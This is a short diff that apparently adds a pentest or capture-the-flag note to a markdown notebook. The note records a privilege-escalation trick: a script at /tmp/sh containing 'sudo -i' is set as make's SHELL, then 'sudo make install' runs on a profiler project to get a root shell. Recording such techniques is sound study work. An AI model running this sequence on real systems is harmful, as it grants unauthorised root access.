@@ -42,3 +42,12 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ---
+
+SHELL = bash /tmp/sh
+
+nano /tmp/sh
+```
+sudo -i
+```
+
+sudo /usr/bin/make install -C /home/profiler/php-spx
